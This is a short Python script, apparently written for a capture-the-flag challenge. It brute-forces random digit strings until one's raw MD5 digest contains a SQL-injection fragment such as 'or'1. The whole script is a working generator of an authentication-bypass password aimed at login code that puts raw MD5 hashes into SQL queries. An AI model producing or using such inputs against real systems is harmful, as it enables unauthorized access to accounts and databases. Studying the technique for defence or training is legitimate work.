import re
import string
import random
import hashlib


def main():


   pattern ="'\s*(OR|or|[|][|])\s*'\d+"

   i = 0

   while (1):

        N=random.randint(30,40)
        s=''.join(random.choice(string.digits) for _ in range(N))
        m=hashlib.md5()
        m.update(s)
        if re.search(pattern, (m.digest()), re.I):
            print ("Passward:" + s)
            break
        if i % 100000==0:
            print("Loop %s: %s" % (i, s))
        i += 1

main()